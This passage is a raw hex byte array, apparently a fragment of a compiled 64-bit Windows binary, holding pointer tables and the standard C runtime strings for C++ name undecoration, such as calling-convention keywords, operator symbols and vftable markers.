0x0, 0x0, 0x0, 0x0, 0x0, 0x64, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x76, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x92, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8c, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb4, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc2, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xda, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xea, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xfa, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x12, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2a, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x42, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6a, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x76, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x84, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x92, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x9c, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xaa, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xbc, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xce, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xde, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x18, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x26, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3a, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x50, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x66, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x72, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7e, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8a, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x9e, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xae, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc0, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xca, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd6, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe2, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf4, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1c, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x32, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4c, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x66, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x72, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8e, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xba, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xca, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xea, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf6, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x14, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x28, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x34, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4a, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5c, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7e, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0x1b, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x98, 0x1b, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb0, 0xe4, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0xd0, 0xe4, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0xd0, 0xe4, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0xaf, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x5c, 0x97, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x50, 0xd8, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x44, 0x9c, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0xf8, 0xd2, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x7c, 0x98, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xe4, 0x26, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0xfa, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x90, 0xfa, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0xfa, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0xfa, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0xfa, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc8, 0xfa, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0xfa, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0xfa, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf4, 0xfa, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x6, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x28, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x52, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x54, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6c, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x74, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x78, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7c, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x94, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x9c, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa0, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa4, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xac, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb0, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb4, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xbc, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc0, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc4, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc8, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xcc, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd0, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd4, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xdc, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe0, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe4, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xec, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf4, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf8, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xfc, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x30, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x14, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x12, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc8, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0xfd, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x28, 0xfd, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x23, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x50, 0xfd, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0xfd, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x20, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0xfd, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0xfd, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x26, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe0, 0xfd, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xfe, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0xf, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0xfe, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x14, 0xfe, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0xfe, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0xf, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x30, 0xfe, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x23, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x54, 0xfe, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x6, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0xfe, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0xfe, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0xe, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0xfe, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa0, 0xfe, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc0, 0xfe, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x25, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0xfe, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x24, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0xff, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x25, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0xff, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0xff, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0xff, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x20, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb0, 0xff, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x22, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0xff, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x28, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0x0, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0x0, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x58, 0x0, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x0, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x11, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x0, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x52, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x90, 0x0, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x11, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0x0, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc8, 0x0, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x12, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe0, 0x0, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x19, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x52, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xac, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe0, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0xfb, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0xfc, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x1, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x15, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5f, 0x5f, 0x62, 0x61, 0x73, 0x65, 0x64, 0x28, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5f, 0x5f, 0x63, 0x64, 0x65, 0x63, 0x6c, 0x0, 0x5f, 0x5f, 0x70, 0x61, 0x73, 0x63, 0x61, 0x6c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5f, 0x5f, 0x73, 0x74, 0x64, 0x63, 0x61, 0x6c, 0x6c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5f, 0x5f, 0x74, 0x68, 0x69, 0x73, 0x63, 0x61, 0x6c, 0x6c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5f, 0x5f, 0x66, 0x61, 0x73, 0x74, 0x63, 0x61, 0x6c, 0x6c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5f, 0x5f, 0x76, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x63, 0x61, 0x6c, 0x6c, 0x0, 0x0, 0x0, 0x0, 0x5f, 0x5f, 0x63, 0x6c, 0x72, 0x63, 0x61, 0x6c, 0x6c, 0x0, 0x0, 0x0, 0x5f, 0x5f, 0x65, 0x61, 0x62, 0x69, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5f, 0x5f, 0x73, 0x77, 0x69, 0x66, 0x74, 0x5f, 0x31, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5f, 0x5f, 0x73, 0x77, 0x69, 0x66, 0x74, 0x5f, 0x32, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5f, 0x5f, 0x70, 0x74, 0x72, 0x36, 0x34, 0x0, 0x5f, 0x5f, 0x72, 0x65, 0x73, 0x74, 0x72, 0x69, 0x63, 0x74, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5f, 0x5f, 0x75, 0x6e, 0x61, 0x6c, 0x69, 0x67, 0x6e, 0x65, 0x64, 0x0, 0x0, 0x0, 0x0, 0x0, 0x72, 0x65, 0x73, 0x74, 0x72, 0x69, 0x63, 0x74, 0x28, 0x0, 0x0, 0x0, 0x20, 0x6e, 0x65, 0x77, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x64, 0x65, 0x6c, 0x65, 0x74, 0x65, 0x0, 0x3d, 0x0, 0x0, 0x0, 0x3e, 0x3e, 0x0, 0x0, 0x3c, 0x3c, 0x0, 0x0, 0x21, 0x0, 0x0, 0x0, 0x3d, 0x3d, 0x0, 0x0, 0x21, 0x3d, 0x0, 0x0, 0x5b, 0x5d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6f, 0x70, 0x65, 0x72, 0x61, 0x74, 0x6f, 0x72, 0x0, 0x0, 0x0, 0x0, 0x2d, 0x3e, 0x0, 0x0, 0x2a, 0x0, 0x0, 0x0, 0x2b, 0x2b, 0x0, 0x0, 0x2d, 0x2d, 0x0, 0x0, 0x2d, 0x0, 0x0, 0x0, 0x2b, 0x0, 0x0, 0x0, 0x26, 0x0, 0x0, 0x0, 0x2d, 0x3e, 0x2a, 0x0, 0x2f, 0x0, 0x0, 0x0, 0x25, 0x0, 0x0, 0x0, 0x3c, 0x0, 0x0, 0x0, 0x3c, 0x3d, 0x0, 0x0, 0x3e, 0x0, 0x0, 0x0, 0x3e, 0x3d, 0x0, 0x0, 0x2c, 0x0, 0x0, 0x0, 0x28, 0x29, 0x0, 0x0, 0x7e, 0x0, 0x0, 0x0, 0x5e, 0x0, 0x0, 0x0, 0x7c, 0x0, 0x0, 0x0, 0x26, 0x26, 0x0, 0x0, 0x7c, 0x7c, 0x0, 0x0, 0x2a, 0x3d, 0x0, 0x0, 0x2b, 0x3d, 0x0, 0x0, 0x2d, 0x3d, 0x0, 0x0, 0x2f, 0x3d, 0x0, 0x0, 0x25, 0x3d, 0x0, 0x0, 0x3e, 0x3e, 0x3d, 0x0, 0x3c, 0x3c, 0x3d, 0x0, 0x26, 0x3d, 0x0, 0x0, 0x7c, 0x3d, 0x0, 0x0, 0x5e, 0x3d, 0x0, 0x0, 0x60, 0x76, 0x66, 0x74, 0x61, 0x62, 0x6c, 0x65, 0x27, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0x76, 0x62, 0x74, 0x61, 0x62, 0x6c, 0x65, 0x27, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0x76, 0x63, 0x61, 